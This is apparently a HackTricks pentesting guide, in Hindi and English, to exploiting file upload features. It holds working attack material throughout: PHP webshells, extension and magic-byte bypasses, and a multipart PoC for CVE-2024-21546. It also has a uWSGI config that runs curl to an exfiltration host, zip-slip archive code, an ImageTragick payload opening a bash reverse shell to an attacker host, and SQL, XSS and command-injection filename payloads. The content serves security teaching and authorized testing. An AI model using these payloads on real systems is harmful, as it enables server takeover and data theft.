# फ़ाइल अपलोड

{{#include ../../banners/hacktricks-training.md}}

## फ़ाइल अपलोड सामान्य कार्यप्रणाली

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Bypass file extensions checks

1. अगर लागू हो, तो **पहले बताई गई extensions** की **जाँच** करें। साथ ही कुछ **uppercase letters** के साथ भी टेस्ट करें: _pHp, .pHP5, .PhAr ..._
2. _Check **adding a valid extension before** the execution extension (use previous extensions also):_
- _file.png.php_
- _file.png.Php5_
3. अंत में **special characters** जोड़कर भी कोशिश करें। आप Burp का उपयोग करके सभी **ascii** और **Unicode** characters को **bruteforce** कर सकते हैं। (_Note that you can also try to use the **previously** motioned **extensions**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. सर्वर-साइड के extension parser को धोखा देकर protections को बाईपास करने की कोशिश करें, जैसे कि **doubling** the **extension** या extensions के बीच **junk data** (**null** bytes) डालना। _You can also use the **previous extensions** to prepare a better payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. पिछले चेक में **एक और लेयर** जोड़ें:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. कोशिश करें कि **exec extension को valid extension से पहले रख दें** और उम्मीद करें कि सर्वर misconfigured हो। (Apache misconfigurations को exploit करने में उपयोगी जहाँ किसी भी चीज़ का extension **.php** है पर जरूरी नहीं कि filename `.php` पर खत्म हो — तब code execute हो सकता है):
- _ex: file.php.png_
7. **Windows** में **NTFS alternate data stream (ADS)** का उपयोग करें। इस केस में, forbidden extension के बाद और permitted extension से पहले colon character ":" डाला जाएगा। परिणामस्वरूप, सर्वर पर एक **empty file with the forbidden extension** बन सकती है (उदा. "file.asax:.jpg”). बाद में इस फ़ाइल को अन्य techniques से edit किया जा सकता है जैसे कि उसकी short filename का उपयोग करके। "**::$data**” pattern का उपयोग non-empty files बनाने के लिए भी किया जा सकता है। इसलिए, इस pattern के बाद dot character जोड़ना आगे की restrictions बाईपास करने में उपयोगी हो सकता है (उदा. "file.asp::$data.”)
8. filename limits तोड़कर देखें। valid extension कट जाती है और malicious PHP बच जाता है। AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

कुछ upload handlers saved filename से trailing dot characters को trim या normalize कर देते हैं। UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) के versions 2.9.1 से पहले, आप extension validation को बाईपास कर सकते हैं:

- एक वैध image MIME और magic header का उपयोग करना (उदा., PNG का `\x89PNG\r\n\x1a\n`)।
- अपलोड की गई फ़ाइल का नाम PHP extension के बाद एक dot के साथ रखना, जैसे `shell.php.`।
- सर्वर trailing dot को हटा देता है और `shell.php` को persist कर देता है, जो कि web-served directory (default public storage जैसे `/storage/files/`) में रखा गया हो तो execute हो सकता है।

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
फिर saved path को हिट करें (Laravel + LFM में सामान्य):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- Upgrade unisharp/laravel-filemanager to ≥ 2.9.1.
- Enforce strict server-side allowlists and re-validate the persisted filename.
- Serve uploads from non-executable locations.

### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header** to: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check by adding at the beginning of the file the **bytes of a real image** (confuse the _file_ command). Or introduce the shell inside the **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` or you could also **introduce the payload directly** in an image:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- If **compressions is being added to your image**, for example using some standard PHP libraries like [PHP-GD](https://www.php.net/manual/fr/book.image.php), the previous techniques won't be useful it. However, you could use the **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- The web page cold also be **resizing** the **image**, using for example the PHP-GD functions `imagecopyresized` or `imagecopyresampled`. However, you could use the **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Another technique to make a payload that **survives an image resizing**, using the PHP-GD function `thumbnailImage`. However, you could use the **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Find a vulnerability to **rename** the file already uploaded (to change the extension).
- Find a **Local File Inclusion** vulnerability to execute the backdoor.
- **Possible Information disclosure**:
1. एक ही फाइल को **कई बार** (और एक ही समय पर) एक ही **नाम** से upload करें
2. ऐसी फाइल upload करें जिसका **name** किसी पहले से मौजूद **file** या **folder** जैसा हो
3. फाइल का नाम **".", "..", या "..."** रखें। उदाहरण के लिए, Apache में **Windows** पर, यदि application अपलोड की गई फाइलों को "/www/uploads/" directory में सेव करता है, तो "." filename "/www/" directory में "uploads" नाम की एक फाइल बना देगा।
4. ऐसी फाइल upload करें जिसे आसानी से delete न किया जा सके जैसे **"...:.jpg"** in **NTFS**. (Windows)
5. **Windows** में ऐसे invalid characters वाले नाम से फाइल upload करें जैसे `|<>*?”`। (Windows)
6. **Windows** में reserved (forbidden) नामों का इस्तेमाल करके फाइल upload करें जैसे CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Try also to **upload an executable** (.exe) or an **.html** (less suspicious) that **will execute code** when accidentally opened by victim.

### Special extension tricks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

The `.phar` files are like the `.jar` for java, but for php, and can be **used like a php file** (executing it with php, or including it inside a script...)

The `.inc` extension is sometimes used for php files that are only used to **import files**, so, at some point, someone could have allow **this extension to be executed**.

## **Jetty RCE**

If you can upload a XML file into a Jetty server you can obtain [RCE because **new \*.xml and \*.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** So, as mentioned in the following image, upload the XML file to `$JETTY_BASE/webapps/` and expect the shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities can be exploited in uWSGI servers if one has the capability to modify the `.ini` configuration file. uWSGI configuration files leverage a specific syntax to incorporate "magic" variables, placeholders, and operators. Notably, the '@' operator, utilized as `@(filename)`, is designed to include the contents of a file. Among the various supported schemes in uWSGI, the "exec" scheme is particularly potent, allowing the reading of data from a process's standard output. This feature can be manipulated for nefarious purposes such as Remote Command Execution or Arbitrary File Write/Read when a `.ini` configuration file is processed.

Consider the following example of a harmful `uwsgi.ini` file, showcasing various schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
The execution of the payload occurs during the parsing of the configuration file. For the configuration to be activated and parsed, the uWSGI process must either be restarted (potentially after a crash or due to a Denial of Service attack) or the file must be set to auto-reload. The auto-reload feature, if enabled, reloads the file at specified intervals upon detecting changes.

यह समझना ज़रूरी है कि uWSGI की configuration file parsing काफी lax है। विशेष रूप से, चर्चा किया गया payload किसी binary file (जैसे image या PDF) में insert किया जा सकता है, जो संभावित exploitation की रेंज को और बढ़ा देता है।

## **wget File Upload/SSRF ट्रिक**

कभी-कभी आप पाएंगे कि server **`wget`** का उपयोग **download files** करने के लिए कर रहा है और आप **URL** indicate कर सकते हैं। ऐसे मामलों में, कोड यह जाँच कर सकता है कि downloaded files के extension एक whitelist में हैं ताकि केवल allowed files ही download हों। हालाँकि, **इस check को bypass किया जा सकता है.**\
Linux में एक **filename** की **maximum** length **255** है, हालांकि **wget** filenames को **236** characters तक truncate कर देता है। आप **download a file called "A"\*232+".php"+".gif"** कर सकते हैं, यह filename **check** को **bypass** कर देगा (जैसा कि इस उदाहरण में **".gif"** एक **valid** extension है) लेकिन `wget` फ़ाइल का **rename** कर देगा और इसे **"A"\*232+".php"** नाम दे देगा।
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

## टूल्स

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) एक शक्तिशाली टूल है जो Pentesters और Bug Hunters को file upload mechanisms की परीक्षण करने में मदद करने के लिए डिज़ाइन किया गया है। यह विभिन्न bug bounty techniques का उपयोग करके vulnerabilities की पहचान और exploit करने की प्रक्रिया को सरल बनाता है, जिससे web applications का thorough assessment सुनिश्चित होता है।

### Corrupting upload indices with snprintf quirks (historical)

कुछ legacy upload handlers जो `snprintf()` या समान तरीकों का उपयोग करके single-file upload से multi-file arrays बनाते हैं, उन्हें `_FILES` structure को forge करने के लिए trick किया जा सकता है। `snprintf()` के inconsistent और truncation व्यवहार के कारण, सावधानीपूर्वक बनाया गया एक single upload सर्वर साइड पर कई indexed files के रूप में दिखाई दे सकता है, जिससे वह logic भ्रमित हो जाता है जो strict shape मानता है (जैसे, इसे multi-file upload मानकर unsafe branches पर जाना)। हालांकि आज के समय में यह niche है, यह “index corruption” pattern कभी-कभी CTFs और पुराने codebases में फिर से दिखाई देता है।

## File upload से अन्य कमजोरियाँ

- **filename** को `../../../tmp/lol.png` सेट करें और **path traversal** हासिल करने की कोशिश करें
- **filename** को `sleep(10)-- -.jpg` सेट करें और आप **SQL injection** करने में सक्षम हो सकते हैं
- **filename** को `<svg onload=alert(document.domain)>` सेट करें ताकि **XSS** प्राप्त हो सके
- **filename** को `; sleep 10;` सेट करके कुछ **command injection** की जाँच करें (और [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- यदि आप web server को किसी URL से image पकड़ने के लिए निर्देशित कर सकते हैं तो आप [SSRF](../ssrf-server-side-request-forgery/index.html) का दुरुपयोग आज़मा सकते हैं। यदि यह **image** किसी **public** साइट पर **saved** होने वाली है, तो आप [https://iplogger.org/invisible/](https://iplogger.org/invisible/) जैसे URL का संकेत दे सकते हैं और हर विज़िटर की जानकारी चुरा सकते हैं।
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). यदि आप PDFs upload कर सकते हैं तो आप कुछ ऐसा PDF तैयार कर सकते हैं जो दिए गए निर्देशों के अनुसार arbitrary JS execute करे।
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- फाइल अपलोड करते समय कोई **size limit** है या नहीं जाँचें

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

अन्य filetypes के लिए देखें [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)।

## Zip/Tar फ़ाइल जो सर्वर पर स्वतः अनपैक होती है

यदि आप ऐसा ZIP upload कर सकते हैं जो सर्वर के अंदर decompressed किया जाएगा, तो आप 2 चीज़ें कर सकते हैं:

### Symlink

ऐसी link upload करें जिसमें अन्य फ़ाइलों के soft links हों, फिर decompressed फाइलों तक पहुँचने पर आप linked files को access कर सकेंगे:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### विभिन्न फ़ोल्डरों में डीकम्प्रेस करें

डीकम्प्रेशन के दौरान डायरेक्टरीज़ में फ़ाइलों का अनपेक्षित निर्माण एक गंभीर समस्या है। शुरुआती अनुमान यह हो सकता है कि यह सेटअप मैलिशियस फ़ाइल अपलोड के जरिए OS-level command execution से सुरक्षा करेगा, लेकिन ZIP archive format का hierarchical compression support और directory traversal क्षमताएँ दुरुपयोग की जा सकती हैं। इससे attackers प्रतिबंधों को बायपास कर सुरक्षित upload directories से निकल सकते हैं, बस लक्ष्य एप्लिकेशन की decompression functionality को manipulate करके।

ऐसे फ़ाइलें बनाने के लिए एक automated exploit [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc) पर उपलब्ध है। इस utility का उपयोग निम्नानुसार किया जा सकता है:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
इसके अतिरिक्त, **symlink trick with evilarc** एक विकल्प है। यदि उद्देश्य `/flag.txt` जैसी फ़ाइल को निशाना बनाना है, तो उस फ़ाइल का symlink आपके सिस्टम में बनाया जाना चाहिए। यह सुनिश्चित करता है कि evilarc को इसके संचालन के दौरान त्रुटियाँ नहीं होंगी।

नीचे एक उदाहरण दिया गया है Python code का, जो एक malicious zip file बनाने के लिए उपयोग किया जाता है:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

अधिक जानकारी के लिए **मूल पोस्ट देखें**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP कोड उन कमांड्स को निष्पादित करने के लिए लिखा गया है जो `$_REQUEST` वेरिएबल के माध्यम से पास किए जाते हैं।

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: कई फाइलें बनाई जाती हैं और इन फाइलों को शामिल करते हुए एक zip आर्काइव तैयार किया जाता है।

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: zip के अंदर की फाइलों के नाम vi या hex editor का उपयोग करके बदल दिए जाते हैं, "xxA" को "../" में बदलकर directory traversal किया जाता है।

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

इस सामग्री को image extension के साथ अपलोड करें ताकि vulnerability **(ImageMagick , 7.0.1-1)** का exploit किया जा सके (exploit देखें: [https://www.exploit-db.com/exploits/39767](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNG पर PHP Shell एम्बेड करना

PNG फ़ाइल के IDAT चंक में एक PHP shell एम्बेड करने से कुछ image processing ऑपरेशन्स को प्रभावी रूप से बायपास किया जा सकता है। PHP-GD के `imagecopyresized` और `imagecopyresampled` फ़ंक्शंस इस संदर्भ में विशेष रूप से प्रासंगिक हैं, क्योंकि वे आमतौर पर क्रमशः इमेज को resize और resample करने के लिए उपयोग किए जाते हैं। इन ऑपरेशन्स से अप्रभावित रहने की क्षमता एम्बेडेड PHP shell के कुछ उपयोग मामलों में महत्वपूर्ण लाभ है।

इस तकनीक का विस्तृत विश्लेषण, जिसमें इसकी methodology और संभावित applications शामिल हैं, निम्नलिखित लेख में दिया गया है: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). यह संसाधन प्रक्रिया और इसके implications की व्यापक समझ प्रदान करता है।

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files साइबर सुरक्षा में एक अनोखा उपकरण हैं, जो chameleons की तरह काम करते हैं और एक साथ कई file formats में वैध रूप से मौजूद हो सकते हैं। एक दिलचस्प उदाहरण है [GIFAR](https://en.wikipedia.org/wiki/Gifar), एक hybrid जो GIF और RAR archive दोनों के रूप में कार्य करता है। ऐसे फाइल्स सिर्फ इस जोड़ी तक सीमित नहीं हैं; GIF और JS या PPT और JS जैसे संयोजन भी संभव हैं।

Polyglot files की मुख्य उपयोगिता यह है कि वे उन security measures को बायपास कर सकते हैं जो फाइल्स को उनके type के आधार पर स्क्रीन करते हैं। कई applications में सिर्फ कुछ file types को upload की अनुमति दी जाती है—जैसे JPEG, GIF, या DOC—ताकि संभावित खतरनाक formats (जैसे JS, PHP, या Phar files) से सुरक्षा की जा सके। हालांकि, एक polyglot, कई file types की structural criteria को पूरा करके, इन प्रतिबंधों को चुपके से बायपास कर सकता है।

फिर भी, polyglots के कुछ limitations होते हैं। उदाहरण के लिए, जबकि एक polyglot एक साथ PHAR file (PHp ARchive) और एक JPEG दोनों हो सकता है, उसकी upload सफलता प्लेटफ़ॉर्म की file extension नीतियों पर निर्भर कर सकती है। अगर सिस्टम अनुमेय extensions के बारे में कड़ा है, तो polyglot की structural duality अपलोड की गारंटी देने के लिए पर्याप्त नहीं हो सकती।

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs जैसे कि यह PDF हो

कैसे file type detections से बचें जब आप एक valid JSON फ़ाइल upload करना चाहते हैं भले ही अनुमति न हो, इसे एक fake PDF फ़ाइल दिखाकर (techniques from **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: जब तक `%PDF` magic bytes पहले 1024 bytes में मौजूद हों यह valid माना जाता है (पोस्ट से उदाहरण लें)
- **`pdflib` library**: JSON के एक field के अंदर एक fake PDF format जोड़ें ताकि library इसे pdf समझे (पोस्ट से उदाहरण लें)
- **`file` binary**: यह एक फ़ाइल से 1048576 bytes तक पढ़ सकता है। बस JSON को इससे बड़ा बनाएं ताकि यह content को json के रूप में पार्स न कर सके और फिर JSON के अंदर वास्तविक PDF का प्रारम्भिक हिस्सा डाल दें और यह इसे PDF समझ लेगा

## संदर्भ

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
